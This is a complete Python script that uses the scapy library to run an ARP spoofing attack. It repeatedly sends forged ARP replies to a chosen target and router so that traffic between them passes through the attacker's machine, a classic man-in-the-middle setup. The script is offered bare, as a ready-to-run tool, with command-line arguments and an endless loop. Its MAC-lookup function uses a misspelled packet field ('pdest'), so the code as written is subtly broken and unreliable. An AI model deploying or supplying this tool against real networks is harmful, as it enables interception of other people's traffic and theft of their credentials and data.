import scapy.all as scapy
import argparse
import time

def get_mac(ip):
    request_packet = scapy.ARP(pdest=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast_packet/request_packet
    answered_list = scapy.srp(arp_packet, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(response_packet, verbose=False)


def args():
    parser = argparse.ArgumentParser()

    parser.add_argument("-t", "--target", dest="target", help="target ip address")
    parser.add_argument("-r", "--router", dest="router", help="router ip address")

    options = parser.parse_args()

    if not options.target:
        parser.error(f"[*] please specify a target, use --help for more info.")
    elif not options.router:
        parser.error(f"[*] please specify a router, use --help for more info.")

    return options.target, options.router


args = args()


while True:
    spoof(args[0], args[1])
    spoof(args[1], args[0])
    time.sleep(2)


